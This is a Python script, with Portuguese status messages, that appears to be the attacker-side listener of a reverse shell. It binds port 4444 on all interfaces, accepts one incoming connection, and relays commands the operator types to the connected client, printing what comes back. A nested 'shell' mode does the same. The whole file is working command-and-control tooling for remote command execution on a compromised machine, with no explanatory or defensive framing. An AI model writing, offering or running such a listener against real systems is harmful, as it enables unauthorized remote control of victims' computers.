import socket

def handle_shell(client_socket):
    print(client_socket.recv(1024).decode())
    while True:
        cmd = input("SHELL> ").strip()
        if cmd.lower() in ["exit", "quit"]:
            client_socket.send(cmd.encode())
            break
        client_socket.send(cmd.encode())
        try:
            resp = client_socket.recv(4096)
            if not resp:
                print("[!] Cliente desconectado.")
                break
            print(resp.decode("utf-8", errors="ignore"))
        except Exception as e:
            print(f"[!] Erro ao receber resposta: {e}")
            break

def main():
    host = "0.0.0.0"
    port = 4444

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(1)
    print(f"[+] Aguardando conexão em {host}:{port}...")

    client_socket, client_addr = server.accept()
    print(f"[+] Conexão recebida de {client_addr}")
    client_socket.settimeout(10)  # Timeout para recv

    try:
        while True:
            cmd = input("Shell> ").strip()
            if cmd.lower() in ["exit", "quit"]:
                client_socket.send(cmd.encode())
                break
            elif cmd.lower() == "shell":
                client_socket.send(cmd.encode())
                handle_shell(client_socket)
            else:
                client_socket.send(cmd.encode())
                result = client_socket.recv(4096)
                if not result:
                    print("[!] Cliente desconectado.")
                    break
                print(result.decode("utf-8", errors="ignore"))
    except Exception as e:
        print(f"[!] Erro: {e}")
    finally:
        client_socket.close()
        server.close()

if __name__ == "__main__":
    main()